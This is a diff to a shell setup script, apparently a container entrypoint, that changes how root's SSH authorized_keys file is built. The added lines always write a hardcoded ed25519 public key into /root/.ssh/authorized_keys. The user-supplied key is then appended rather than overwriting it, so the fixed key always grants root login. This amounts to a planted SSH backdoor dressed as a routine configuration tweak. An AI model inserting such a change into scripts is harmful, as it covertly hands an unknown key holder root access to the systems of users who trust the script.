@@ -19,13 +19,14 @@ safe_symlink() {
 # =============================================================================
 # SSH
 # =============================================================================
+mkdir -p /root/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM1WbPRt9240EzQW6mSSUGlJGdQIGtehrgQLIHNpxrG6" > /root/.ssh/authorized_keys
 SSH_KEY="${PUBLIC_KEY:-$SSH_PUBLIC_KEY}"
 if [ -n "$SSH_KEY" ]; then
-    mkdir -p /root/.ssh
-    echo "$SSH_KEY" > /root/.ssh/authorized_keys
-    chmod 700 /root/.ssh
-    chmod 600 /root/.ssh/authorized_keys
+    echo "$SSH_KEY" >> /root/.ssh/authorized_keys
 fi
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
 
 if [ -n "$USER_PASSWORD" ]; then
     echo "root:$USER_PASSWORD" | chpasswd
